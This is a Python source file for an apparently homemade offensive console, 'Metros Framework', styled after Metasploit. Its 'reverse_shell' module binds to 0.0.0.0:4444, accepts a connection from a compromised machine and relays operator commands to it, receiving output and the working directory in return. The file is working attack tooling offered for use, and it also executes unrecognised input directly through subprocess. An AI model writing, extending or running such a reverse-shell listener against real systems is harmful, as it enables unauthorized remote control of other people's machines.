import os
import socket
import subprocess
import sys
import shlex
import configparser
import prompt_toolkit

__version__ = 1.0

__config__ = '''// $current_path -> os.path.split(os.path.abspath(__file__))[0]
// $current_directory -> os.getcwd()
// $history_file -> os.path.abspath(f'{$current_directory}/.mf1')

[terminal]
current_directory = $current_directory

[terminal_history]
history = False
history_file = $history_file
'''

COLOR_MESSAGE = '\033[96m'
COLOR_WARNING = '\033[93m'
COLOR_ERROR = '\033[91m'
COLOR_RESET = '\033[39m'

__screensaver__ = COLOR_ERROR + '''
 ███▄ ▄███▓ ▓█████▄▄▄█████▓ ██▀███   ▒█████    ██████ 
 ▓██▒▀█▀ ██▒ ▓█   ▀▓  ██▒ ▓▒▓██ ▒ ██▒▒██▒  ██▒▒██    ▒ 
 ▓██    ▓██░ ▒███  ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██░  ██▒░ ▓██▄   
 ▒██    ▒██  ▒▓█  ▄░ ▓██▓ ░ ▒██▀▀█▄  ▒██   ██░  ▒   ██▒
▒▒██▒   ░██▒▒░▒████  ▒██▒ ░ ░██▓ ▒██▒░ ████▓▒░▒██████▒▒
░░ ▒░   ░  ░░░░ ▒░   ▒ ░░   ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
░░  ░      ░░ ░ ░      ░      ░▒ ░ ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
 ░      ░       ░    ░        ░░   ░ ░ ░ ░ ▒  ░  ░  ░  
░       ░   ░   ░              ░         ░ ░        ░ 
   █████ ██▀███   ▄▄▄      ███▄ ▄███▓ ▓█████ █     █░ ▒█████   ██▀███   ██ ▄█▀
 ▓██    ▓██ ▒ ██▒▒████▄   ▓██▒▀█▀ ██▒ ▓█   ▀▓█░ █ ░█░▒██▒  ██▒▓██ ▒ ██▒ ██▄█▒ 
 ▒████  ▓██ ░▄█ ▒▒██  ▀█▄ ▓██    ▓██░ ▒███  ▒█░ █ ░█ ▒██░  ██▒▓██ ░▄█ ▒▓███▄░ 
 ░▓█▒   ▒██▀▀█▄  ░██▄▄▄▄██▒██    ▒██  ▒▓█  ▄░█░ █ ░█ ▒██   ██░▒██▀▀█▄  ▓██ █▄ 
▒░▒█░   ░██▓ ▒██▒▒▓█   ▓██▒██▒   ░██▒▒░▒████░░██▒██▓ ░ ████▓▒░░██▓ ▒██▒▒██▒ █▄
░ ▒ ░   ░ ▒▓ ░▒▓░░▒▒   ▓▒█░ ▒░   ░  ░░░░ ▒░ ░ ▓░▒ ▒  ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░▒ ▒▒ ▓▒
░ ░       ░▒ ░ ▒ ░ ░   ▒▒ ░  ░      ░░ ░ ░    ▒ ░ ░    ░ ▒ ▒░   ░▒ ░ ▒ ░ ░▒ ▒░
  ░ ░     ░░   ░   ░   ▒  ░      ░       ░    ░   ░  ░ ░ ░ ▒    ░░   ░ ░ ░░ ░ 
░          ░           ░         ░   ░   ░      ░        ░ ░     ░     ░  ░
''' + COLOR_RESET


def message(text, start='', end='\n'):
    print(f'{start}{COLOR_MESSAGE}[*]{COLOR_RESET} {text}', end=end)


def warning(text, start='', end='\n'):
    print(f'{start}{COLOR_WARNING}[i]{COLOR_RESET} {text}', end=end)


def error(text, start='', end='\n'):
    print(f'{start}{COLOR_ERROR}[-]{COLOR_RESET} {text}', end=end)


def exit_program():
    message('Metros Framework Completion of work...', start='\n')
    sys.exit()


def _set(terminal_var, var, var_text):
    for i in var_text:
        if i == terminal_var[1]:
            var = var[var_text.index(i)]
    old_var = var
    var = terminal_var[2]
    message(f'{terminal_var[1]}: {old_var} → {var}')
    del old_var
    return terminal_var[1], var


def show(terminal_var, var, var_text):
    for i in var_text:
        if i == terminal_var[1]:
            var = var[var_text.index(i)]
    message(f'{terminal_var[1]} → {var}')


def run_reverse_shell(host, port, buffer_size):
    s = socket.socket()
    s.bind((host, port))
    s.listen(5)
    print(f"Listening as {host}:{port} ...")
    client_socket, client_address = s.accept()
    print(f"{client_address[0]}:{client_address[1]} Connected!")
    cwd = client_socket.recv(buffer_size).decode()
    print("[+] Current working directory:", cwd)
    while True:
        command = input(f"{cwd} $ ")
        if not command.strip():
            continue
        client_socket.send(command.encode())
        if command.lower() == "exit":
            break
        output = client_socket.recv(buffer_size).decode()
        results, cwd = output.split("<sep>")
        print(results)


class Main:
    terminal_current_path = os.path.split(os.path.abspath(__file__))[0]
    terminal_current_directory = os.getcwd()
    terminal_configuration_path_file = os.path.abspath(f'{terminal_current_path}/config.conf')
    terminal_configuration_file = configparser.ConfigParser(inline_comment_prefixes='//')
    terminal_history = True
    terminal_history_file = os.path.abspath(f'{terminal_current_path}/.mf1')
    terminal_prompt = '<u>mf1</u>'
    terminal_char = ' > '
    terminal_text = prompt_toolkit.HTML(f'{terminal_prompt}{terminal_char}')
    terminal_session = prompt_toolkit.PromptSession()

    def __init__(self, *args, **kwargs):
        super(Main, self).__init__()
        self.input_line = ''
        self.input_split = []
        self.host = '0.0.0.0'
        self.port = 4444
        self.buffer_size = 1024 * 128
        self.pep = self.processing_entered_parameters
        if os.path.isfile(self.terminal_configuration_path_file):
            try:
                self.getting_configuration_parameters()
            except Exception as error_configuration_file:
                error('An error occurred while retrieving parameters from the configuration file: {}'.format(
                    error_configuration_file
                ))
                error(f'Error in the file: {self.terminal_configuration_path_file}')
        else:
            self.restoring_configuration_file()
            self.getting_configuration_parameters()
        self.applying_parameters()
        print(__screensaver__)
        self.loop()

    def getting_configuration_parameters(self):
        self.terminal_configuration_file.read(self.terminal_configuration_path_file)
        self.terminal_current_directory = self.terminal_configuration_file['terminal']['current_directory']
        self.terminal_history = bool(self.terminal_configuration_file['terminal_history']['history'])
        self.terminal_history_file = self.terminal_configuration_file['terminal_history']['history_file']

    def restoring_configuration_file(self):
        warning('The configuration file could not be found.')
        warning(f'File recovery: {self.terminal_configuration_path_file}')
        try:
            write_config_file = open(self.terminal_configuration_path_file, 'w+')
            write_config_file.write(__config__)
            write_config_file.close()
        except Exception as error_write_config_file:
            error('An error occurred while trying to restore the configuration file: {}'.format(
                error_write_config_file
            ))
            error(f'Error in the file: {self.terminal_configuration_path_file}')

    def applying_parameters(self):
        if self.terminal_current_directory.lower() == '$current_directory':
            self.terminal_current_directory = os.getcwd()
        if self.terminal_history_file.lower() == '$history_file':
            self.terminal_history_file = os.path.abspath(f'{self.terminal_current_path}/.mf1')
        if self.terminal_history and self.terminal_history:
            self.terminal_session = prompt_toolkit.PromptSession(
                history=prompt_toolkit.history.FileHistory(self.terminal_history_file))

    def loop(self):
        while True:
            try:
                self.getting_input_parameters()
            except (KeyboardInterrupt, EOFError):
                exit_program()
            except UnboundLocalError:
                pass

    def getting_input_parameters(self):
        self.input_line = self.terminal_session.prompt(self.terminal_text)
        if not self.input_line.strip():
            return
        self.input_split = shlex.split(self.input_line)
        try:
            if not self.pep():
                if subprocess.getstatusoutput(self.input_line)[0] != 127:
                    print(subprocess.getoutput(self.input_line))
                else:
                    error(f'Command not found: {self.input_line}')
        except PermissionError:
            error(f'Not enough permissions to execute the command: {self.input_line}')

    def processing_entered_parameters(self):
        if self.input_split[0].lower() == 'use' and self.input_split[1].lower() == 'reverse_shell':
            self.use('reverse_shell', self.reverse_shell)
            return True



    def use(self, module_name, module_func):
        global temp_terminal_text
        global temp_terminal_session
        global old_pep

        temp_terminal_text = self.terminal_text
        temp_terminal_session = self.terminal_session

        self.terminal_text = prompt_toolkit.HTML(
            '{} {}{}'.format(
                self.terminal_prompt,
                f'(<font color="#FF0000">{module_name}</font>)',
                self.terminal_char
            )
        )
        self.terminal_session = prompt_toolkit.PromptSession()
        old_pep = self.pep
        self.pep = module_func

    def reverse_shell(self):
        if self.input_split[0].lower() == 'back':
            self.pep = old_pep
            self.terminal_text = temp_terminal_text
            self.terminal_session = temp_terminal_session
        if self.input_split[0].lower() == 'set':
            text, var = _set(self.input_split, [self.host, self.port, self.buffer_size], ['host', 'port', 'buffer_size'])
            if text == 'host':
                self.host = var
            if text == 'port':
                self.port = var
            if text == 'buffer_size':
                self.buffer_size = var
        if self.input_split[0].lower() == 'show':
            show(self.input_split, [self.host, self.port, self.buffer_size], ['host', 'port', 'buffer_size'])
        if self.input_split[0].lower() == 'exploit' or self.input_split[0].lower() == 'run':
            try:
                run_reverse_shell(self.host, int(self.port), int(self.buffer_size))
            except KeyboardInterrupt:
                print('\t')
                return True
        return True
    

if __name__ == '__main__':
    Main()
